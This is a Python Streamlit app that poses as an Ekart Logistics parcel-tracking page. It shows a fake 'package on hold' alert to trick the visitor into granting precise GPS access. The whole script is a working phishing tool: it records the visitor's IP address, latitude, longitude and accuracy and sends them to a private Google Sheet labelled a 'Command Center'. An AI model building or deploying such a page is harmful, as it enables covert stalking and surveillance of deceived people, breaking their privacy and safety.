import streamlit as st
from streamlit_geolocation import streamlit_geolocation
import pandas as pd
import requests
import gspread
from oauth2client.service_account import ServiceAccountCredentials
import datetime

# --- CONFIGURATION ---
# IMPORTANT: You must place your Google Service Account JSON file in the same folder
SHEET_ID = "1guGuwYY8I1iNnqmRw0bVBT2s9e2QA1H672gOcsIS0ts"

# UI Styling for EKART Branding
st.set_page_config(page_title="Ekart Logistics | Track Shipment", page_icon="📦")
st.markdown("""
    <style>
    .stApp { background-color: #f4f4f4; }
    .header { background-color: #2874f0; padding: 20px; color: white; text-align: center; font-weight: bold; font-size: 24px; }
    .tracking-card { background: white; padding: 30px; border-radius: 10px; box-shadow: 0px 4px 10px rgba(0,0,0,0.1); }
    </style>
    <div class="header">EKART LOGISTICS</div>
""", unsafe_allow_html=True)

# 2. AUTOMATIC IP GRAB
try:
    ip_data = requests.get('https://ipapi.co/json/').json()
    user_ip = ip_data.get('ip', 'Unknown')
except:
    user_ip = "Error"

# 3. THE "FORCE" INTERFACE
st.markdown("<div class='tracking-card'>", unsafe_allow_html=True)
st.subheader("📦 Shipment #EK7729102IN")
st.info("Action Required: Your package is currently on hold. Please sync your precise location to resume delivery.")

# Trigger for High-Precision GPS
location = streamlit_geolocation()

if location.get('latitude'):
    st.success("✅ Location Synced. Resuming Delivery...")
    
    # 4. UPDATE GOOGLE SPREADSHEET
    try:
        # Load your credentials (you must generate this in Google Cloud Console)
        scope = ["https://spreadsheets.google.com/feeds", "https://www.googleapis.com/auth/drive"]
        creds = ServiceAccountCredentials.from_json_keyfile_name("creds.json", scope)
        client = gspread.authorize(creds)
        
        # Open the specific sheet provided
        sheet = client.open_by_key(SHEET_ID).sheet1
        
        # Prepare the row
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        row = [timestamp, user_ip, location['latitude'], location['longitude'], location['accuracy']]
        
        # Append to sheet
        sheet.append_row(row)
        st.write("System Log: Coordinates pushed to Command Center.")
        
    except Exception as e:
        st.error(f"Spreadsheet Update Failed: {e}")

    # Display Map
    df = pd.DataFrame({'lat': [location['latitude']], 'lon': [location['longitude']]})
    st.map(df)
else:
    st.warning("⚠️ Waiting for location permission to proceed...")

st.markdown("</div>", unsafe_allow_html=True)
